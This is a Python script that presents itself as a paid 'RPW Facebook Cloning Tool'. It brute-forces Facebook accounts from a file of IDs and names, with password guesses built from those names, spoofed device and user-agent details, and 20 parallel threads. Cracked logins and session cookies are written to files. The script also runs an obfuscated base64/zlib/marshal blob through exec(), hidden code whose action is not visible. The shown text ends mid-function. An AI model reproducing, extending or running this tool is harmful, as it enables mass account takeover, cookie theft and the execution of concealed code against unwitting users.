fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

import os,base64,zlib,pip,sys, re, requests, time, random, json, string
import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'zh_HK'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'TNT'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm} 

def clear():
	os.system('clear')
def back():
	login()
        
#YEAR CHECKER
def alex(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = '2009'
        elif ids[:9] in ['100000000']       :alif = '2009'
        elif ids[:8] in ['10000000']        :alif = '2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif ids[:6] in ['100001']          :alif = '2010-2011'
        elif ids[:6] in ['100002','100003'] :alif = '2011-2012'
        elif ids[:6] in ['100004']          :alif = '2012-2013'
        elif ids[:6] in ['100005','100006'] :alif = '2013-2014'
        elif ids[:6] in ['100007','100008'] :alif = '2014-2015'
        elif ids[:6] in ['100009']          :alif = '2015'
        elif ids[:5] in ['10001']           :alif = '2015-2016'
        elif ids[:5] in ['10002']           :alif = '2016-2017'
        elif ids[:5] in ['10003']           :alif = '2018-2019'
        elif ids[:5] in ['10004']           :alif = '2019-2020'
        elif ids[:5] in ['10005']           :alif = '2020'
        elif ids[:5] in ['10006','10007','']:alif = '2021'
        elif ids[:5] in ['10008']           :alif = '2022'
        elif ids[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = '2008-2009'
    elif len(ids)==8:
        alif = '2007-2008'
    elif len(ids)==7:
        alif = '2006-2007 '
    elif len(ids) in [13,14]:
        alif = '2023-2024'
    else:alif=''
    return alif

#YEAR CHECKER 2
def gray(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = '2009'
        elif uid[:9] in ['100000000']       :alif = '2009'
        elif uid[:8] in ['10000000']        :alif = '2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif uid[:6] in ['100001']          :alif = '2010-2011'
        elif uid[:6] in ['100002','100003'] :alif = '2011-2012'
        elif uid[:6] in ['100004']          :alif = '2012-2013'
        elif uid[:6] in ['100005','100006'] :alif = '2013-2014'
        elif uid[:6] in ['100007','100008'] :alif = '2014-2015'
        elif uid[:6] in ['100009']          :alif = '2015'
        elif uid[:5] in ['10001']           :alif = '2015-2016'
        elif uid[:5] in ['10002']           :alif = '2016-2017'
        elif uid[:5] in ['10003']           :alif = '2018-2019'
        elif uid[:5] in ['10004']           :alif = '2019-2020'
        elif uid[:5] in ['10005']           :alif = '2020'
        elif uid[:5] in ['10006','10007','']:alif = '2021'
        elif uid[:5] in ['10008']           :alif = '2022'
        elif uid[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' 2008-2009 '
    elif len(uid)==8:
        alif = ' 2007-2008 '
    elif len(uid)==7:
        alif = ' 2006-2007 '
    elif len(uid) in [13,14]:
        alif = ' 2023 '
    else:alif=''
    return alif

import marshal,zlib,base64
exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
        
logo="""\33[1;32m

                 █████╗ ██╗  ██╗██╗     
                ██╔══██╗╚██╗██╔╝██║     
                ███████║ ╚███╔╝ ██║     
                ██╔══██║ ██╔██╗ ██║     
                ██║  ██║██╔╝ ██╗███████╗
                ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
\33[1;32m ─────────────────────────────────────────────────────── 
  Owner      :  Thiago Wu
  Facebook   :  https://www.facebook.com/thiago.wu69
  Tool Type  :  RPW Facebook Cloning Tool (Paid)
  Network    :  No Load Needed
  Version    :  1.1
\33[1;32m ───────────────────────────────────────────────────────"""
def linex():
	print(f'\033[1;32m ───────────────────────────────────────────────────────')
def clear():
        os.system('clear')
        print(logo)
user_opt=[]
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]


def menu():
    clear()
    print(' [1] File Cloning')
    linex()
    xd = input(' Choose an option: ')
    if xd in ['1', '01']:
        clear()
        print(' Put file example:  /sdcard/File.txt  ')
        linex()
        file = input(' Put file path:\033[1; \033[92;1m ')
        try:
            fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            print(' File location not found ')
            time.sleep(1)
            menu()
        clear()
        print(' [1] Method 1')
        print(' [2] Method 2')
        print(' [3] Method 3')
        linex()
        mthd = input(' Choose: ')
        linex()
        plist = []
        print(' Select Password Crack Menu:')
        linex()
        print(' [1] Crack with Automatic Password \n [2] Crack with Password Choice \n [3] Working Passwords for Cloning ')
        linex()
        ppp = input('\033[1;32m Choose: ')
        if ppp in ['1', '01']:
            plist.append('first last')
            plist.append('firstlast')
            plist.append('first')
            plist.append('last')
            plist.append('first123')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first143')
            plist.append('last123')
            plist.append('last1234')
            plist.append('last12345')
            plist.append('last143')
            plist.append('lastfirst')
            plist.append('last first')
            plist.append('firstlast123')
            plist.append('lastfirst123')
            plist.append('firstlast143')
            plist.append('lastfirst143')
            plist.append('first last123')
            plist.append('last first123')
            plist.append('first last143')
            plist.append('last first143')
            plist.append('firstmaganda')
            plist.append('firstpogi')
            plist.append('lastmaganda')
            plist.append('lastpogi')
            plist.append('firstcute')
            plist.append('lastcute')
            plist.append('first2022')
            plist.append('first2023')
            plist.append('iloveyou')
            plist.append('i love you')
            plist.append('jesus123')
            plist.append('jesus143')
            plist.append('god123')
            plist.append('god143')
            
        elif ppp in ['3', '03']:
            clear()
            print(' \033[1;32mWorking password for Philippines\033[1;37m ')
            linex()
            print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first12345\n [5] first123\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
            
            linex()
            input(' Press enter to back menu ')
            menu()
        else:
            try:
                linex()
                ps_limit = int(input(' How many passwords do you want to add? '))
            except:
                ps_limit = 1
            linex()
            print('\033[1;32m example: first last,firtslast,first123')
            linex()
            for i in range(ps_limit):
                plist.append(input(f'\033[1;32m Put password {i+1}: '))
        #linex()
        ###print(' Do you want to show cookies? (y/n): ')
        #linex()
        ####c = input('\033[1;32m Choose: ')
        #######if (c).lower() == "y":
            ####user_opt.append("c")
        #$$#$$##with tred(max_workers=20) as Aking:
            linex()
            print(' Do you want to show cp accounts? (y/n): ')
        linex()
        cx = input('\033[1;32m Choose: ')
        if cx in ['y', 'Y', 'yes', 'Yes', '1']:
            pcp.append('y')
        else:
            pcp.append('n')
        with tred(max_workers=20) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(' [•] Total accounts : \033[1;32m' + total_ids + f' \033[1;33m---\033[1;33m> \033[1;37mMethod Number :\033[1;37m {mthd}')
            print("\033[1;37m \x1b[38;5; \033[92;1m[•] Use airplane mode every 200 counts.\033[1;37m")
            
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if mthd in ['1', '01']:
                    crack_submit.submit(ffb1, ids, names, passlist)
                elif mthd in ['2', '02']:
                    crack_submit.submit(ffb00, ids, names, passlist)
                elif mthd in ['3', '03']:
                    crack_submit.submit(ffb22, ids, names, passlist)
                ######elif mthd in ['4', '04']:
                    #######crack_submit.submit(ffb4, ids, names, passlist)
                #######elif mthd in ['5', '05']:
                    ######crack_submit.submit(ffb5, ids, names, passlist)

        print('\033[1;37m')
        linex()
        print(' The process has completed')
        print(' Total OK/CP/2F: ' + str(len(oks)) + '/' + str(len(cps)) + '/' + str(len(twf)))
        linex()
        input(' Press enter to go back ')
        #####os.system('python alexcloning_allsim.py')
    #######elif xd in ['2','02']:
		    ####tokengetter()
    ########elif xd in ['3','03']:
		    ###file_making()

def ffb22(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
                        ua13 = random.choice(useragent1)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua13, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ALEX=session.cookies.get_dict().keys()
                        if "c_user" in ALEX:
                                coki=session.cookies.get_dict()
                                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ALEX-ALIVE] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                if ids[:4] in ['1000']:
                                	open(f'/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                elif ids[:4] in ['6155']:
                                	open(f'/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                open(f'/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')                                	
                                open(f'/sdcard/ALEX-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ALEX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open(f'/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass

def ffb00(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
                        ua12 = random.choice(useragent)

